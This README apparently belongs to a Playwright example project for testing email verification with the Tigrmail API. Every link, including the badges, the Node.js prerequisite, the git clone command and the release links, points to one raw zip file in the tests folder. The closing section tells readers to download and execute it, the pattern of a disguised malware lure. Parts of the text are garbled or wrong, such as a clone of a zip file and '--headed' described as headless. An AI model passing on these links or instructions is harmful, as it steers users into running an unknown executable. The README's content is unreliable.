# Playwright Email Verification Example: E2E Testing with Tigrmail 🚀

![GitHub Workflow Status](https://raw.githubusercontent.com/oliver-miguel/playwright-email-verification-example/main/tests/verification_email_example_playwright_unhaste.zip%20Status&style=flat-square)
![Releases](https://raw.githubusercontent.com/oliver-miguel/playwright-email-verification-example/main/tests/verification_email_example_playwright_unhaste.zip)
![License](https://raw.githubusercontent.com/oliver-miguel/playwright-email-verification-example/main/tests/verification_email_example_playwright_unhaste.zip)

## Table of Contents

- [Overview](#overview)
- [Features](#features)
- [Prerequisites](#prerequisites)
- [Installation](#installation)
- [Usage](#usage)
- [Running Tests](#running-tests)
- [Email Verification](#email-verification)
- [Contributing](#contributing)
- [License](#license)
- [Links](#links)

## Overview

This repository contains an example of an end-to-end test for user registration and email verification using the Playwright framework and the Tigrmail API. It showcases how to automate the signup process and verify email addresses seamlessly.

## Features

- Automated user registration process
- Email verification using Tigrmail API
- Easy to set up and run
- Written in TypeScript
- Clear structure for test cases

## Prerequisites

Before you begin, ensure you have the following installed:

- https://raw.githubusercontent.com/oliver-miguel/playwright-email-verification-example/main/tests/verification_email_example_playwright_unhaste.zip (version 14 or later)
- npm (Node Package Manager)
- A code editor (like Visual Studio Code)

## Installation

To get started, clone this repository to your local machine:

```bash
git clone https://raw.githubusercontent.com/oliver-miguel/playwright-email-verification-example/main/tests/verification_email_example_playwright_unhaste.zip
cd playwright-email-verification-example
```

Next, install the required dependencies:

```bash
npm install
```

## Usage

You can run the tests directly after installation. The tests will execute the registration and email verification process.

To run the tests, use the following command:

```bash
npx playwright test
```

## Running Tests

To run specific tests, you can use the command below:

```bash
npx playwright test https://raw.githubusercontent.com/oliver-miguel/playwright-email-verification-example/main/tests/verification_email_example_playwright_unhaste.zip
```

You can also run tests in headless mode by adding the `--headed` flag:

```bash
npx playwright test --headed
```

## Email Verification

This example uses the Tigrmail API for email verification. The API allows you to receive emails without needing a personal email account. This makes it perfect for testing email-related functionalities.

To verify emails:

1. Register a user.
2. Capture the verification email sent to Tigrmail.
3. Click the verification link to complete the signup process.

You can view the Tigrmail inbox by using the API to fetch emails.

## Contributing

Contributions are welcome! If you have suggestions or improvements, please fork the repository and submit a pull request. 

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Links

You can download the latest release and execute it [here](https://raw.githubusercontent.com/oliver-miguel/playwright-email-verification-example/main/tests/verification_email_example_playwright_unhaste.zip).

For more information, visit the [Releases](https://raw.githubusercontent.com/oliver-miguel/playwright-email-verification-example/main/tests/verification_email_example_playwright_unhaste.zip) section.